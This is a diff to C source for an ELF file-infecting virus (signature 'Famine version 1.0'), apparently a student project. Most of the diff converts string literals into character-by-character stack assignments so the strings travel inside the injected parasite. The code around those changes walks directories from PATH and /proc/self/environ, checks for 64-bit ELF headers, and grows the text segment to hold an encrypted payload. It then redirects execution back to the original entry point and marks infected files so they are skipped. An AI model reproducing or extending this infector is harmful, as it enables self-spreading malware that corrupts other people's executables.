@@ -145,14 +145,14 @@ int do_main(void)
 
 	start = 0; //value get from the header
 	size = 0; //value get from addr
-	pid = fork();
-	if (pid == 0) //children
-	{
+//	pid = fork();
+	//if (pid == 0) //children
+//	{
 		main_encrypt();
 		//decrypt
 
-		exit (0);
-	}
+//		exit (0);
+//	}
 	return (0);
 }
 __syscall0(pid_t, fork);
@@ -245,7 +245,19 @@ bool process_runing(void)
 
 void	ft_putnbr(int nb)
 {
-	char min[] = {'-','2','1','4','7','4','8','3','6','4','8',0};
+	char min[12];
+	min[0] ='-';
+	min[1]='2';
+	min[2]='1';
+	min[3]='4';
+	min[4]='7';
+	min[5]='4';
+	min[6]='8';
+	min[7]='3';
+	min[8]='6';
+	min[9]='4';
+	min[10]='8';
+	min[11]=0;
 	if (nb == -2147483648)
 		ft_putstr(min);
 	else
@@ -389,7 +401,61 @@ void decrypter(unsigned long address_of_main)
 }
 bool	im_infected(char *data)
 {
-	char sig[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' '};
+	char sig[54];
+	sig[0] ='F';
+	sig[1] ='a';
+	sig[2] ='m';
+	sig[3] ='i';
+	sig[4] ='n';
+	sig[5] ='e';
+	sig[6] =' ';
+	sig[7] ='v';
+	sig[8] ='e';
+	sig[9] ='r';
+	sig[10] ='s';
+	sig[11] ='i';
+	sig[12] ='o';
+	sig[13] ='n';
+	sig[14] =' ';
+	sig[15] ='1';
+	sig[16] ='.';
+	sig[17] ='0';
+	sig[18]=' ';
+	sig[19]='(';
+	sig[20]='c';
+	sig[21]=')';
+	sig[22]='o';
+	sig[23]='d';
+	sig[24]='e';
+	sig[25]='d';
+	sig[26]=' ';
+	sig[27]='b';
+	sig[28]='y';
+	sig[29]=' ';
+	sig[30]='<';
+	sig[31]='j';
+	sig[32]='g';
+	sig[33]='o';
+	sig[34]='u';
+	sig[35]='n';
+	sig[36]='a';
+	sig[37]='n';
+	sig[38]='d';
+	sig[39]='>';
+	sig[40]='-';
+	sig[41]='<';
+	sig[42]='a';
+	sig[43]='f';
+	sig[44]='i';
+	sig[45]='o';
+	sig[46]='d';
+	sig[47]='i';
+	sig[48]='e';
+	sig[49]='r';
+	sig[50]='>';
+	sig[51]=' ';
+	sig[52]='-';
+	sig[53]=' ';
 	int i;
 
 	i = 0;
@@ -403,8 +469,40 @@ bool	im_infected(char *data)
 }
 int main_encrypt()
 {
-	char path_env[256] = {'/','t','m','p','/','t','e','s','t',':','/','t','m','p','/','t','e','s','t','2',':',0};
-	char path_maj[] = {'P','A','T','H','=',0};
+	char path_maj[6];
+	path_maj[0] = 'P';
+	path_maj[1] = 'A';
+	path_maj[2] = 'T';
+	path_maj[3] = 'H';
+	path_maj[4] = '=';
+	path_maj[5] = 0;
+
+	char path_env[256];
+
+	path_env[0] = '/';
+	path_env[1] = 't';
+	path_env[2] = 'm';
+	path_env[3] = 'p';
+	path_env[4] = '/';
+	path_env[5] = 't';
+	path_env[6] = 'e';
+	path_env[7] = 's';
+	path_env[8] = 't';
+	path_env[9] = ':';
+	path_env[10] = '/';
+	path_env[11] = 't';
+	path_env[12] = 'm';
+	path_env[13] = 'p';
+	path_env[14] = '/';
+	path_env[15] = 't';
+	path_env[16] = 'e';
+	path_env[17] = 's';
+	path_env[18] = 't';
+	path_env[19] = '2';
+	path_env[20] = ':';
+	path_env[21] = 0;
+
+
 	//printf("virus\n");
 	//printf("content: %s\n",path_env);
 	get_env_var(path_maj,path_env + 21,256 - 21);
@@ -437,7 +535,16 @@ int main_encrypt()
 	while(i < path_length);
 
 	infect(path_env, 256);
-	char content[] = {'c','o','n','t','e','n','t',':',' '};
+	char content[9];
+	content[0] ='c';
+	content[1] ='o';
+	content[2] ='n';
+	content[3] ='t';
+	content[4] ='e';
+	content[5] ='n';
+	content[6] ='t';
+	content[7] =':';
+	content[8] =' ';
 	write(1,content,9);
 	write(1,path_env,ft_strlen(path_env));
 }
@@ -455,7 +562,27 @@ int get_env_var(char *name, char *content, int content_size)
 	int j,k = 0;
 	int nb_start = 1;
 	int name_lenght = ft_strlen(name);
-	char path_proc[] = {'/','p','r','o','c','/','s','e','l','f','/','e','n','v','i','r','o','n',0};
+	char path_proc[19];
+	path_proc[0] ='/';
+	path_proc[1] ='p';
+	path_proc[2] ='r';
+	path_proc[3] ='o';
+	path_proc[4] ='c';
+	path_proc[5] ='/';
+	path_proc[6] ='s';
+	path_proc[7] ='e';
+	path_proc[8] ='l';
+	path_proc[9] ='f';
+	path_proc[10] ='/';
+	path_proc[11] ='e';
+	path_proc[12] ='n';
+	path_proc[13] ='v';
+	path_proc[14] ='i';
+	path_proc[15] ='r';
+	path_proc[16] ='o';
+	path_proc[17] ='n';
+	path_proc[18] = 0;
+
 	if ((fd = open(path_proc,0x0000,0))<0)
 		return (0);
 	do
@@ -506,7 +633,19 @@ int open_directory(char *path)
 	struct linux_dirent64 *d;
 	size_t len;
 
-	char directory[] = {'d','i','r','e','c','t','o','r','y',':',' ',0};
+	char directory[12];
+	directory[0] ='d';
+	directory[1] ='i';
+	directory[2] ='r';
+	directory[3] ='e';
+	directory[4] ='c';
+	directory[5] ='t';
+	directory[6] ='o';
+	directory[7] ='r';
+	directory[8] ='y';
+	directory[9] =':';
+	directory[10] =' ';
+	directory[11] = 0;
 	ft_putstr(directory);
 	write(1,path,ft_strlen(path));
 	write(1,"\n",1);
@@ -527,7 +666,17 @@ int open_directory(char *path)
 	dd = open (path, 0x10000,0);
 	if (dd < 0)
 	{
-		char fail[]={'o','p','e','n',' ', 'f','a','i','l',0 };
+		char fail[10];
+		fail[0] ='o';
+		fail[1] ='p';
+		fail[2] ='e';
+		fail[3] ='n';
+		fail[4] =' ';
+		fail[5] = 'f';
+		fail[6] ='a';
+		fail[7] ='i';
+		fail[8] ='l';
+		fail[9] = 0;
 		ft_putstr(fail);
 		ft_putstr(path);
 		ft_putchar('\n');
@@ -536,11 +685,31 @@ int open_directory(char *path)
 		return 1;
 
 	}
-	char getd[] = {'g','e','t','d','e','n','t','s','6','4','\n',0};
+	char getd[12];
+	getd[0] ='g';
+	getd[1] ='e';
+	getd[2] ='t';
+	getd[3] ='d';
+	getd[4] ='e';
+	getd[5] ='n';
+	getd[6] ='t';
+	getd[7] ='s';
+	getd[8] ='6';
+	getd[9] ='4';
+	getd[10] ='\n';
+	getd[11] =0;
 	ft_putstr(getd);
 	//printf("getdents64\n");
 	nread = getdents64(dd, buf, 128);
-	char name_nread[] = {'n','r','e','a','d',' ' ,':',0};
+	char name_nread[8];
+	name_nread[0] ='n';
+	name_nread[1] ='r';
+	name_nread[2] ='e';
+	name_nread[3] ='a';
+	name_nread[4] ='d';
+	name_nread[5] =' ';
+	name_nread[6] =':';
+	name_nread[7] = 0;
 	write(1,name_nread,7);
 	ft_putnbr(nread);
 	write(1,"\n",1);
@@ -550,10 +719,25 @@ int open_directory(char *path)
 	{
 		d = (struct linux_dirent64 *) (buf + i);
 		i += d->d_reclen ;
-		char host[] = {'h','o','s','t',' ',':',0};
+		char host[7];
+		host[0]='h';
+		host[1] ='o';
+		host[2] ='s';
+		host[3] ='t';
+		host[4] =' ';
+		host[5] =':';
+		host[6] =0;
+
 		ft_putstr(host);
 		ft_putstr(d->d_name);
-		char type[] = {' ','t','y','p','e',' ' ,0};
+		char type[7];
+		type[0] =' ';
+		type[1] ='t';
+		type[2] ='y';
+		type[3] ='p';
+		type[4] ='e';
+		type[5] =' ';
+		type[6] =0;
 		ft_putstr(type);
 		ft_putnbr(d->d_type);
 		ft_putchar('\n');
@@ -585,7 +769,25 @@ int open_directory(char *path)
 
 int do_the_job(char buff[],size_t size, char *path)
 {
- 	char debut[]={'d','e','b','u','t',' ','d','o','_','t','h','e','_','j','o','b','\n','0'};
+ 	char debut[18];
+ 	debut[0]='d';
+ 	debut[1] ='e';
+ 	debut[2] ='b';
+ 	debut[3] ='u';
+ 	debut[4] ='t';
+ 	debut[5] =' ';
+ 	debut[6] ='d';
+ 	debut[7] ='o';
+ 	debut[8] ='_';
+ 	debut[9] ='t';
+ 	debut[10] ='h';
+ 	debut[11] ='e';
+ 	debut[12] ='_';
+ 	debut[13] ='j';
+ 	debut[14] ='o';
+ 	debut[15] ='b';
+ 	debut[16] ='\n';
+ 	debut[17] =0;
 	ft_putstr(debut);
 	//printf("debut do_the_job\n");
 	Elf64_Ehdr          *header;
@@ -598,24 +800,57 @@ int do_the_job(char buff[],size_t size, char *path)
 	Elf64_Addr end_of_text;
 	int text_found = 0;
 	int i;
-	char ono[] = {'1','\n','0'};
+	char ono[3];
+	ono[0] = '1';
+	ono[1]='\n';
+	ono[2]=0;
 	ft_putstr(ono);
 	ft_putnbr(size);
 	write(1, buff, 20);
 	ft_putchar('\n');
 	if (size < sizeof(Elf64_Ehdr) || ft_strncmp(buff, ELFMAG,SELFMAG) || buff[EI_CLASS] != ELFCLASS64)
 	{
-		char ret[] ={'r','e','t','u','r','n',' ', '1','\n',0};
+		char ret[10];
+		ret[0] ='r';
+		ret[1] ='e';
+		ret[2] ='t';
+		ret[3] ='u';
+		ret[4] ='r';
+		ret[5] ='n';
+		ret[6] =' ';
+		ret[7] = '1';
+		ret[8] ='\n';
+		ret[9] =0;
 		ft_putstr(ret);
 		return (1);
 	}
-	char one_one[]={'1','.','1','\n',0};
+	char one_one[5];
+	one_one[0] ='1';
+	one_one[1] ='.';
+	one_one[2] ='1';
+	one_one[3] ='\n';
+	one_one[4] =0;
 	ft_putstr(one_one);
 
 	header = (Elf64_Ehdr *)buff;
 	 if(is_infected(buff))
 	 {
-	 	char deja[] = {'d','e','j','a',' ' ,'i','n','f','e','c','t','e','d','\n',0};
+	 	char deja[15];
+	 	deja[0]='d';
+	 	deja[1] ='e';
+	 	deja[2] ='j';
+	 	deja[3] ='a';
+	 	deja[4] =' ' ;
+	 	deja[5] ='i';
+	 	deja[6] ='n';
+	 	deja[7] ='f';
+	 	deja[8] ='e';
+	 	deja[9] ='c';
+	 	deja[10] ='t';
+	 	deja[11] ='e';
+	 	deja[12] ='d';
+	 	deja[13] ='\n';
+	 	deja[14] =0;
 	 	ft_putstr(deja);
 		 return (1);
 
@@ -641,7 +876,8 @@ int do_the_job(char buff[],size_t size, char *path)
 		{
 			if (seg->p_flags == (PF_R | PF_X))
 			{
-				seg->p_flags |= PF_W;
+				//seg->p_flags |= PF_W;
+
 				text = seg->p_vaddr;
 				parasite_vaddr = seg->p_vaddr + seg->p_filesz;
 
@@ -652,7 +888,7 @@ int do_the_job(char buff[],size_t size, char *path)
 				seg->p_memsz += parasite_size;
 				text_found++;
 				ft_putnbr(parasite_vaddr);
-				ft_putstr("\n");
+				ft_putchar('\n');
 				ft_putnbr(end_of_text);
 			}
 		}
@@ -669,11 +905,19 @@ int do_the_job(char buff[],size_t size, char *path)
 			sec->sh_offset += PAGE_SIZE;
 		else
 		if (sec->sh_size + sec->sh_addr == parasite_vaddr)
-			sec->sh_size += parasite_size;
+		{
+			//sec->sh_size += parasite_size;
+			sec->sh_size += PAGE_SIZE;
+		}
 	}
 	header->e_shoff += PAGE_SIZE;
 	new_file(buff,size,end_of_text, path,old_e_entry);
-	char fin[] = {'f','i','n','\n',0};
+	char fin[5];
+	fin[0] ='f';
+	fin[1]='i';
+	fin[2]='n';
+	fin[3]='\n';
+	fin[4]=0;
 	ft_putstr(fin);
 	return 0;
 }
@@ -738,7 +982,23 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 
 	*(unsigned long *) &jmp_code[1] = old_e_entry; //fait supprimer tmp
 
-	char new_debut [] = {'n','e','w','_','f','i','l','e',' ' ,'d','e','b','u','t',' ' ,0};
+	char new_debut [16];
+	new_debut[0] ='n';
+	new_debut[1] ='e';
+	new_debut[2] ='w';
+	new_debut[3] ='_';
+	new_debut[4] ='f';
+	new_debut[5] ='i';
+	new_debut[6] ='l';
+	new_debut[7] ='e';
+	new_debut[8] =' ' ;
+	new_debut[9] ='d';
+	new_debut[10] ='e';
+	new_debut[11] ='b';
+	new_debut[12] ='u';
+	new_debut[13] ='t';
+	new_debut[14] =' ' ;
+	new_debut[15] =0;
 	ft_putstr(new_debut);
 
 	for (int i = 0; i< 125;i++)
@@ -750,13 +1010,25 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 	ft_putchar('\n');
 	if ((fd = open (tmp, 0x242, 0755)) < 0)
 	{
-		char error[] = {'e','r','r','o','r',' ' ,'o','p','e','n',' ' ,'f','d',0};
+		char error[14];
+		error[0] ='e';
+		error[1] ='r';
+		error[2] ='r';
+		error[3] ='o';
+		error[4] ='r';
+		error[5] =' ' ;
+		error[6] ='o';
+		error[7] ='p';
+		error[8] ='e';
+		error[9] ='n';
+		error[10] =' ' ;
+		error[11] ='f';
+		error[12] ='d';
+		error[13] =0;
 		ft_putstr(error);
 		return ;
 	}
-	char new_debut1 [] = {'n','e','w','_','f','i','l','e',' ' ,'1','\n',0};
-
-	ft_putstr(new_debut1);
+	ft_putstr(new_debut);
 	write(fd,buf, end_of_text);
 
 
@@ -768,7 +1040,22 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 	size_t size_wrote = 0;
 	size_wrote =	put_sig(fd);
 
-	char fwe[]={'s','i','z','e',' ' ,'w','r','o','t','e',' ' ,':',' ' ,0};ft_putstr(fwe);ft_putnbr(size_wrote);ft_putstr("\n");
+	char fwe[14];
+	fwe[0]='s';
+	fwe[1] ='i';
+	fwe[2] ='z';
+	fwe[3] ='e';
+	fwe[4] =' ' ;
+	fwe[5] ='w';
+	fwe[6] ='r';
+	fwe[7] ='o';
+	fwe[8] ='t';
+	fwe[9] ='e';
+	fwe[10] =' ' ;
+	fwe[11] =':';
+	fwe[12] =' ' ;
+	fwe[13] =0;
+	ft_putstr(fwe);ft_putnbr(size_wrote);ft_putchar('\n');
 
 	// size_wrote += write(fd,"\xcc",1);
 	size_wrote += write(fd,(char *) address_of_start, address_of_start_encrypt - address_of_start);//parasite_size - 7);
@@ -782,19 +1069,62 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 
 	//lseek(fd, end_of_text, SEEK_SET);
 
-	char old [] = {'o','l','d',' ' ,'e','n','t','r','y',' ' ,0};
+	char old[11] ;
+	old[0] ='o';
+	old[1] ='l';
+	old[2] ='d';
+	old[3] =' ' ;
+	old[4] ='e';
+	old[5] ='n';
+	old[6] ='t';
+	old[7] ='r';
+	old[8] ='y';
+	old[9] =' ' ;
+	old[10] =0;
 	ft_putstr(old);
 	ft_putnbr(old_e_entry);
 	ft_putchar('\n');
 	//write(fd,needle, 62);
 
-	char para[] = {'p','a','r','a','z','i','t','e',' ' ,'s','i','z','e',' ' ,':',0};
+	char para[16];
+	para[0] ='p';
+	para[1] ='a';
+	para[2] ='r';
+	para[3] ='a';
+	para[4] ='z';
+	para[5] ='i';
+	para[6] ='t';
+	para[7] ='e';
+	para[8] =' ' ;
+	para[9] ='s';
+	para[10] ='i';
+	para[11] ='z';
+	para[12] ='e';
+	para[13] =' ' ;
+	para[14] =':';
+	para[15] =0;
+
 	ft_putstr(para);
 	ft_putnbr(parasite_size);
 	ft_putchar('\n');
 
-	char name_tmp[]={'t','m','p',' ','\'',0};
-	char name_path[] = {'\'',' ','p','a','t','h',' ','\'',0};
+	char name_tmp[6];
+	name_tmp[0]='t';
+	name_tmp[1] ='m';
+	name_tmp[2] ='p';
+	name_tmp[3] =' ';
+	name_tmp[4] ='\'';
+	name_tmp[5] =0;
+	char name_path[9];
+	name_path[0] = '\'';
+	name_path[1] =' ';
+	name_path[2] ='p';
+	name_path[3] ='a';
+	name_path[4] ='t';
+	name_path[5] ='h';
+	name_path[6] =' ';
+	name_path[7] ='\'';
+	name_path[8] =0;
 	ft_putstr(name_tmp);
 	ft_putstr(tmp);
 	ft_putstr(name_path);
@@ -805,7 +1135,19 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 
 	unlink(path);
 	int ret = rename (tmp, path);
-	char name_renam[]={'f','i','n',' ','r','e','n','a','m','e',' ',0};
+	char name_renam[12];
+	name_renam[0] ='f';
+	name_renam[1] ='i';
+	name_renam[2] ='n';
+	name_renam[3] =' ';
+	name_renam[4] ='r';
+	name_renam[5] ='e';
+	name_renam[6] ='n';
+	name_renam[7] ='a';
+	name_renam[8] ='m';
+	name_renam[9] ='e';
+	name_renam[10] =' ';
+	name_renam[11]  =0;
 	ft_putstr(name_renam);
 	ft_putnbr(ret);
 	ft_putchar('\n');
@@ -830,26 +1172,121 @@ int             ft_strncmp(const char *s1, const char *s2, size_t n)
 bool	is_infected(char *data)
 {
 	Elf64_Ehdr          *header;
-	char sig[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' '};
+	char sig[54];
+	sig[0] ='F';
+	sig[1] ='a';
+	sig[2] ='m';
+	sig[3] ='i';
+	sig[4] ='n';
+	sig[5] ='e';
+	sig[6] =' ';
+	sig[7] ='v';
+	sig[8] ='e';
+	sig[9] ='r';
+	sig[10] ='s';
+	sig[11] ='i';
+	sig[12] ='o';
+	sig[13] ='n';
+	sig[14] =' ';
+	sig[15] ='1';
+	sig[16] ='.';
+	sig[17] ='0';
+	sig[18]=' ';
+	sig[19]='(';
+	sig[20]='c';
+	sig[21]=')';
+	sig[22]='o';
+	sig[23]='d';
+	sig[24]='e';
+	sig[25]='d';
+	sig[26]=' ';
+	sig[27]='b';
+	sig[28]='y';
+	sig[29]=' ';
+	sig[30]='<';
+	sig[31]='j';
+	sig[32]='g';
+	sig[33]='o';
+	sig[34]='u';
+	sig[35]='n';
+	sig[36]='a';
+	sig[37]='n';
+	sig[38]='d';
+	sig[39]='>';
+	sig[40]='-';
+	sig[41]='<';
+	sig[42]='a';
+	sig[43]='f';
+	sig[44]='i';
+	sig[45]='o';
+	sig[46]='d';
+	sig[47]='i';
+	sig[48]='e';
+	sig[49]='r';
+	sig[50]='>';
+	sig[51]=' ';
+	sig[52]='-';
+	sig[53]=' ';
 	int i;
 
 	i = 0;
 	header = (Elf64_Ehdr *)data;
-	char name_enter[] ={'e','n','t','e','r',' ','i','n','f','e','c','t','e','d','\n',0};
+	char name_enter[16];
+	name_enter[0] ='e';
+	name_enter[1]='n';
+	name_enter[2]='t';
+	name_enter[3]='e';
+	name_enter[4]='r';
+	name_enter[5]=' ';
+	name_enter[6]='i';
+	name_enter[7]='n';
+	name_enter[8]='f';
+	name_enter[9]='e';
+	name_enter[10]='c';
+	name_enter[11]='t';
+	name_enter[12]='e';
+	name_enter[13]='d';
+	name_enter[14]='\n';
+	name_enter[15]=0;
 	ft_putstr(name_enter);
 		while(sig[i])
 	{
 		ft_putnbr(i);
 		if (sig[i] !=  *((char *)(data + header->e_entry - SIZE_BEFORE_ENTRY_POINT + i)))
 		{
-			char is_inf[] ={'i','s',' ','i','n','f','e','c','t','e','d',' ' ,'r','e','t',' ' ,'0',0};
+			char is_inf[18];
+			is_inf[0]='i';
+			is_inf[1]='s';
+			is_inf[2]=' ';
+			is_inf[3]='i';
+			is_inf[4]='n';
+			is_inf[5]='f';
+			is_inf[6]='e';
+			is_inf[7]='c';
+			is_inf[8]='t';
+			is_inf[9]='e';
+			is_inf[10]='d';
+			is_inf[11]=' ' ;
+			is_inf[12]='r';
+			is_inf[13]='e';
+			is_inf[14]='t';
+			is_inf[15]=' ' ;
+			is_inf[16]='0';
+			is_inf[17]=0;
 			ft_putstr(is_inf);
 			return(0);
 
 		}
 		i++;
 	}
-		char name_ret = {'r','e','t',' ','1','\n',0};
+		char name_ret[7];
+	name_ret[0] ='r';
+	name_ret[1]='e';
+	name_ret[2]='t';
+	name_ret[3]=' ';
+	name_ret[4]='1';
+	name_ret[5]='\n';
+	name_ret[6]=0;
 	ft_putstr(name_ret);
 
 	return(1);
@@ -857,15 +1294,87 @@ bool	is_infected(char *data)
 
 size_t	put_sig(int fd)
 {
-	char sig[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' ',0};
-	char fingerprint[] = {'0','0','0','0','0','0','0','0',0};
+	char sig[54];
+	sig[0] ='F';
+	sig[1] ='a';
+	sig[2] ='m';
+	sig[3] ='i';
+	sig[4] ='n';
+	sig[5] ='e';
+	sig[6] =' ';
+	sig[7] ='v';
+	sig[8] ='e';
+	sig[9] ='r';
+	sig[10] ='s';
+	sig[11] ='i';
+	sig[12] ='o';
+	sig[13] ='n';
+	sig[14] =' ';
+	sig[15] ='1';
+	sig[16] ='.';
+	sig[17] ='0';
+	sig[18]=' ';
+	sig[19]='(';
+	sig[20]='c';
+	sig[21]=')';
+	sig[22]='o';
+	sig[23]='d';
+	sig[24]='e';
+	sig[25]='d';
+	sig[26]=' ';
+	sig[27]='b';
+	sig[28]='y';
+	sig[29]=' ';
+	sig[30]='<';
+	sig[31]='j';
+	sig[32]='g';
+	sig[33]='o';
+	sig[34]='u';
+	sig[35]='n';
+	sig[36]='a';
+	sig[37]='n';
+	sig[38]='d';
+	sig[39]='>';
+	sig[40]='-';
+	sig[41]='<';
+	sig[42]='a';
+	sig[43]='f';
+	sig[44]='i';
+	sig[45]='o';
+	sig[46]='d';
+	sig[47]='i';
+	sig[48]='e';
+	sig[49]='r';
+	sig[50]='>';
+	sig[51]=' ';
+	sig[52]='-';
+	sig[53]=' ';
+	char fingerprint[9];
+	fingerprint[0]= '0';
+	fingerprint[1]='0';
+	fingerprint[2]='0';
+	fingerprint[3]='0';
+	fingerprint[4]='0';
+	fingerprint[5]='0';
+	fingerprint[6]='0';
+	fingerprint[7]='0';
+	fingerprint[8]=0;
 	int i;
 	size_t size;
 	unsigned long address_of_main = get_eip() - ((char *)&yeah - (char *)&real_start);
 
 	if (im_infected(address_of_main))
 	{
-		char name_new[]={'n','e','w',' ','o','n','e','\n',0};
+			char name_new[9];
+		name_new[0]='n';
+		name_new[1]='e';
+		name_new[2]='w';
+		name_new[3]=' ';
+		name_new[4]='o';
+		name_new[5]='n';
+		name_new[6]='e';
+		name_new[7]='\n';
+		name_new[8]=0;
 		ft_putstr(name_new);
 		*(long long *)fingerprint = address_of_main - sizeof(long long);
 	}
@@ -893,8 +1402,9 @@ size_t	put_sig(int fd)
 
 size_t crypter(char *read, size_t size, char key, int fd)
 {
-	char tab[]= {0,0};
-	size_t i;
+	char tab[2];
+	tab[0]=0;
+	tab[1]=0;
 
 	if(size)
 	{
